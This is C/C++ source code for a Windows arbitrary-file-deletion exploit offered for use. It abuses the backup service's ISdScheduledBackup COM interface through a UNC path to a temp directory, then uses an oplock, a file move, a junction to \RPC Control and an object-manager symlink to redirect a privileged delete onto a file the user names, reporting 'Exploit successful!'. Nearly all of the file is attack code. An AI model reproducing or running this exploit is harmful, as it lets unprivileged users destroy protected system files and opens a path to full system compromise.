#include "def.h"

int wmain(int argc,wchar_t** argv)
{

    load();
    if (argc < 2) {
        printf("[+] Usage: %ls <file to delete>\n", argv[0]);
        return 1;
    }

    target = argv[1];

    dir = GetTmpDir();
    printf("[*] Directory: %ls\n", dir);
    if (!CreateDirectory(dir, NULL)) {
        return 1;
    }
    hDir = CreateFile(dir, GENERIC_WRITE | GENERIC_READ|DELETE, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT|FILE_FLAG_DELETE_ON_CLOSE, NULL);

    if (hDir == INVALID_HANDLE_VALUE) {
        return 1;

    }
   
    WCHAR path[MAX_PATH * 2] = { 0x0 };
    GetFinalPathNameByHandle(hDir, path, MAX_PATH * 2, VOLUME_NAME_NONE);
    swprintf(unc, L"\\\\127.0.0.1\\c$%ls", path);
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)FindFile,hDir,0,NULL);
    Trigger();
    HANDLE success;
    do {
        success = CreateFile(target, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    } while (success != INVALID_HANDLE_VALUE);
    printf("[+] Exploit successful!\n");
    DeleteJunction(hDir);
    DelDosDeviceSymLink(object, BuildPath(target));
}
BOOL Trigger() {
    HRESULT hr = CoInitialize(NULL);
    ISdScheduledBackup* sdc;
   
    
    PStruct_10 aaa = (PStruct_10)malloc(sizeof(Struct_10));
    hr = CoCreateInstance(__uuidof(CLSID_SDC), NULL, CLSCTX_LOCAL_SERVER, __uuidof(ISdScheduledBackup), (LPVOID*)&sdc);
    if (SUCCEEDED(hr)) {
        printf("[*] Path: %ls\n", unc);
        hr = sdc->Proc7(unc, aaa);
        if (SUCCEEDED(hr)) {
            return TRUE;
        }
        else
        {
            printf("0x%x\n", hr);
            return FALSE;
        }
    }
    else
    {
        printf("0x%x\n", hr);
        return FALSE;
    }


}

void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }\
        if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
            printf("Cannot load api's %d\n", GetLastError());
            exit(0);
        }

}
void cb() {
    printf("[+] Oplock!\n");
    while(!Move(hFile)){}
    
    CreateJunction(hDir, L"\\RPC Control");
    DosDeviceSymLink(object, BuildPath(target));
    
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}
VOID FindFile(HANDLE hDidr) {
    PFILE_NOTIFY_INFORMATION fi = NULL;
    WCHAR file[MAX_PATH] = { 0x0 };
    FileOpLock* oplock;
    WCHAR* final_path = (WCHAR*)malloc(MAX_PATH);
    HANDLE  hDir = CreateFile(dir, GENERIC_WRITE | GENERIC_READ, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    BOOL stop = FALSE;
    do {

        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hDir, buff, 4096, FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
       
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if (fi->Action == FILE_ACTION_ADDED) {
            stop = TRUE;
        }
    } while (stop == FALSE);
    _swprintf(file, L"%s\\%s",dir, fi->FileName);
    _swprintf(object, L"Global\\GLOBALROOT\\RPC Control\\%s", fi->FileName);
    do {
        hFile = CreateFile(file, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    } while (hFile == INVALID_HANDLE_VALUE);

    oplock = FileOpLock::CreateLock(hFile, cb);
    if (oplock != nullptr) {
        oplock->WaitForLock(INFINITE);
        delete oplock;
    }
}
LPWSTR GetTmpDir() {
    LPWSTR username;
    DWORD szUsername = 0;
    WCHAR path[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0x0 };

    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    GetUserName(NULL, &szUsername);
    username = (LPWSTR)malloc(szUsername);
    GetUserName(username, &szUsername);
    swprintf(path, L"C:\\users\\%s\\appdata\\local\\temp\\%s", username, str_uuid);

    return path;
}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
    UNICODE_STRING ufile;
    HANDLE hDir;
    pRtlInitUnicodeString(&ufile, file);
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    NTSTATUS retcode;
    InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

    retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

    if (!NT_SUCCESS(retcode)) {
        return NULL;
    }
    return hDir;
}